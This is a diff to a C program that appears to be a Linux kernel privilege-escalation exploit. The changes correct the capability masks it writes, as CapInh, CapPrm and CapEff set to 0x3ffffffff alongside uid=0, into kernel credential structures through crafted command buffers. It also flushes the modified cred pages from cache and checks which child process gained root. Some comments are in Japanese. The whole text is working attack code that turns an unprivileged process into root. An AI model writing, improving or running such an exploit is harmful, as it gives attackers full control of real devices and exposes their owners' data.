@@ -682,7 +682,7 @@ int main(int argc, char **argv) {
                 cmd[dw++] = zl; cmd[dw++] = zh;
             }
 
-            // Write uid=0 and caps
+            // Write uid=0 and full caps (0x3ffffffff for each)
             memset(ib_m, 0, 0x10000);
             dw = 0;
             split64(cbase + 0x04, &zl, &zh);
@@ -691,9 +691,10 @@ int main(int argc, char **argv) {
             for (int i = 0; i < 8; i++) cmd[dw++] = 0;
             cmd[dw++] = 0x00000004;
             cmd[dw++] = 0; cmd[dw++] = 0;
-            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F;
-            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F;
-            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F;
+            // CapInh, CapPrm, CapEff を 0x3ffffffff (低32=0xFFFFFFFF, 高32=0x00000003) に設定
+            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;   // CapInh
+            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;   // CapPrm
+            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;   // CapEff
             cmd[dw++] = 0; cmd[dw++] = 0;
             // Readback uid
             memset(dst_m, 0, 0x1000);
@@ -711,7 +712,7 @@ int main(int argc, char **argv) {
             printf("  CRED[%d]: uid=0x%08X %s\n", p, uid,
                 uid == 0 ? "OK" : "FAIL");
 
-            // ----- FIX: Force CPU cache flush for the modified cred page -----
+            // Force CPU cache flush for the modified cred page
             flush_dc_civac_range((void*)cred_pages[p], 0x1000);
         }
         printf("  Phase 8b: %d creds updated\n", n_ok);
@@ -767,7 +768,7 @@ int main(int argc, char **argv) {
 
     close(notify_pipe[1]);
 
-    // ----- FIX: Give children a moment to write, then try non-blocking read -----
+    // Give children a moment to write, then try non-blocking read
     sleep(1);
     struct pollfd pfd = { .fd = notify_pipe[0], .events = POLLIN };
     pid_t winner = 0;
